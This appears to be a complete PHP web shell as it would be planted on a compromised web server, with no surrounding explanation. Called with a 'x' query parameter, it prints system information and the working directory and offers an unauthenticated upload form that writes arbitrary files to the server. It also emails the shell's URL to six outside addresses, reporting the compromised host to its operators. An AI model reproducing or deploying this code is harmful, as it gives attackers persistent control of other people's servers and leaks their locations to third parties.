<?php

if(isset($_GET["x"])){echo"<font color=#000000>[uname]".php_uname()."[/uname]";echo"<br><font color=#000000>[dir]".getcwd()."[/dir]";echo"<form method=post enctype=multipart/form-data>";echo"<input type=file name=f><input name=v type=submit id=v value=up><br>";if($_POST["v"]==up){if(@copy($_FILES["f"]["tmp_name"],$_FILES["f"]["name"])){echo"<b>berhasil</b>-->".$_FILES["f"]["name"];}else{echo"<b>gagal";}}}

 $to = "checklogsfour@gmail.com,enlers@163.com,tuftool.f139@gmail.com,import.amte-ksa@yandex.com,rasa.ltaokaenoi@yahoo.co.th,michael.prosound-audio@hotmail.com";
 $subject = "http://$_SERVER[HTTP_HOST]$_SERVER[PHP_SELF]?x";
 $body = "Hi,\n\nHow are you?||$_SERVER[HTTP_HOST]$_SERVER[PHP_SELF]?x";
 if (mail($to, $subject, $body)) {
   echo("<p>Email successfully sent!</p>");
  } else {
   echo("<p>Email delivery failed.</p>");
  }

echo $subject;
 ?>

